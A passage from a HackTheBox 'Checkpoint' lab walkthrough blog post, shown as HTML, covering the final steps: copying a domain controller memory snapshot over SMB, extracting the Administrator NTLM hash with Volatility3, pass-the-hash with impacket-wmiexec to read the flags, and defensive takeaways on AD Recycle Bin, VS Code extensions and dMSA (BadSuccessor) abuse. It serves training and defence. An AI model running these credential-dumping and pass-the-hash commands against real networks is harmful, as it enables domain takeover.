+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /tmp/cp_dump &amp;&amp; <span class="built_in">cd</span> /tmp/cp_dump</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;use VMBackups\nlcd /tmp/cp_dump\ncd &#x27;NightlyBackup_2024-11-01/memory forensics&#x27;\nget Windows Server 2019-Snapshot1.vmem\n&quot;</span> | \</span><br><span class="line">  smbclient.py -k -no-pass <span class="string">&#x27;CHECKPOINT.HTB/evil_dmsa5$@DC01.CHECKPOINT.HTB&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Then let Volatility3 do the work. <code>windows.hashdump</code> locates the registry hives in the memory image, pulls <code>SYSTEM</code>‘s boot key and uses it to decrypt the SAM password hashes:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install --user volatility3</span><br><span class="line">vol -f <span class="string">&#x27;Windows Server 2019-Snapshot1.vmem&#x27;</span> windows.hashdump.Hashdump</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User              rid  lmhash                            nthash</span><br><span class="line">Administrator     500  aad3b435b51404eeaad3b435b51404ee  f29e9c014295b9b32139b09a2790be3b</span><br><span class="line">Guest             501  aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0</span><br></pre></td></tr></table></figure></div>
+
+<p><code>Administrator : f29e9c014295b9b32139b09a2790be3b</code>. No cracking needed, since NTLM authentication accepts the hash itself.</p>
+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>Let’s confirm the hash works and go looking for the flag in one shot. It isn’t where you’d expect, so rather than guessing we search the whole drive:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec -hashes :f29e9c014295b9b32139b09a2790be3b \</span><br><span class="line">  checkpoint.htb/administrator@dc01.checkpoint.htb \</span><br><span class="line">  <span class="string">&#x27;cmd.exe /c where /R C:\ root.txt&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\max.palmer\Desktop\root.txt</span><br><span class="line">C:\Users\max.palmer\Desktop\root.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>There’s <code>max.palmer</code>, the account that stood out at the bottom of our user enumeration right at the start. The flag lives on their desktop instead of Administrator’s, which is a small final twist that catches anyone who types the usual path, gets <code>File Not Found</code> and assumes the pass-the-hash failed. One more call:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec -hashes :f29e9c014295b9b32139b09a2790be3b \</span><br><span class="line">  checkpoint.htb/administrator@dc01.checkpoint.htb \</span><br><span class="line">  <span class="string">&#x27;cmd.exe /c type C:\Users\max.palmer\Desktop\root.txt&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">af0f2a9b2623a6f9ac14994e1b68c10d</span><br></pre></td></tr></table></figure></div>
+
+<p>Domain compromised.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user : 96be0e6161e0911adc41e06444f0ce7e</span><br><span class="line">root : af0f2a9b2623a6f9ac14994e1b68c10d</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><ul>
+<li><strong><code>CN=Deleted Objects</code> is a credential store nobody audits.</strong> With the AD Recycle Bin enabled, deleted accounts keep their passwords and their group memberships, and restoring one only needs write on the tombstone plus <code>CREATE_CHILD</code> on a destination container. Delegating write access to that container, or to individual objects inside it, hands out every account the domain has ever deleted.</li>
+<li><strong>A writable share plus someone else’s automation is RCE with their token.</strong> We never had any privilege over <code>ryan.brooks</code>. We just put a file where his scheduled VS Code instance would read it.</li>
+<li><strong>VS Code extensions are unsandboxed Node.js.</strong> A <code>.vsix</code> is a zip, <code>activate()</code> runs on load, and <code>child_process</code> is right there. “Approved extensions only” isn’t a control unless something actually verifies the signature, and a share with a friendly comment verifies nothing.</li>
+<li><strong>BadSuccessor and BetterSuccessor turn <code>CREATE_CHILD</code> on an OU into account takeover.</strong> The dMSA migration flow was designed to carry key material forward so migrations don’t break services, and the KDC never checks whether the migration was authorised. Audit who can create objects in your OUs, and keep in mind that the original patch didn’t close the variant that writes <code>msDS-SupersededServiceAccountState</code> and <code>msDS-SupersededManagedAccountLink</code> by hand.</li>
+<li><strong>A RAM snapshot of a domain controller is the domain controller.</strong> <code>.vmem</code>, <code>.vmss</code>, crash dumps, hibernation files, they all contain LSASS and LSASS contains everything. Snapshot and backup storage needs the same access controls as the DC it came from, which on this box meant one service account read ACL stood between a low-privileged user and the Administrator hash.</li>
+<li><strong>Spray findings and path findings are different findings.</strong> Those ten <code>Summer2024!</code> accounts got us nowhere on Checkpoint and it’s still the first thing I’d escalate in a real report. Don’t throw a finding away just because it wasn’t the one that worked.</li>
+</ul>
+<p>That was it for Checkpoint, hope you learned something new!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Checkpoint</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-10-24 18:30:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-10-24 14:20:13
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/10/24/Hackthebox-Checkpoint/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/Active-Directory/">#Active Directory</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Assumed-Breach/">#Assumed Breach</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Password-Spraying/">#Password Spraying</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/bloodyAD/">#bloodyAD</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Tombstone-Restore/">#Tombstone Restore</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/AD-Recycle-Bin/">#AD Recycle Bin</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Deleted-Objects/">#Deleted Objects</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/VS-Code/">#VS Code</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/vsix/">#vsix</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Rubeus/">#Rubeus</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/tgtdeleg/">#tgtdeleg</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/dMSA/">#dMSA</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/BadSuccessor/">#BadSuccessor</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/BetterSuccessor/">#BetterSuccessor</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Volatility3/">#Volatility3</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Pass-the-Hash/">#Pass-the-Hash</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Windows-PE/">#Windows-PE</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/10/16/Hackthebox-Eloquia/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Eloquia</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Checkpoint</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Authenticated-Enumeration"><span class="nav-text">Authenticated Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Password-Spraying-with-Summer2024"><span class="nav-text">Password Spraying with Summer2024!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Finding-the-Real-Path-with-bloodyAD"><span class="nav-text">Finding the Real Path with bloodyAD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Restoring-a-Tombstoned-Account"><span class="nav-text">Restoring a Tombstoned Account</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Foothold-Malicious-VS-Code-Extension"><span class="nav-text">Foothold - Malicious VS Code Extension</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#User-Flag"><span class="nav-text">User Flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-BetterSuccessor"><span class="nav-text">Privilege Escalation - BetterSuccessor</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Getting-a-ticket-for-ryan-with-tgtdeleg"><span class="nav-text">Getting a ticket for ryan with tgtdeleg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fixing-the-clock-skew"><span class="nav-text">Fixing the clock skew</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#What-ryan-can-write-to"><span class="nav-text">What ryan can write to</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Weaponising-the-dMSA"><span class="nav-text">Weaponising the dMSA</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reading-VMBackups-as-the-dMSA"><span class="nav-text">Reading VMBackups as the dMSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dumping-the-Administrator-Hash-with-Volatility3"><span class="nav-text">Dumping the Administrator Hash with Volatility3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Root-Flag"><span class="nav-text">Root Flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Key-Takeaways"><span class="nav-text">Key Takeaways</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
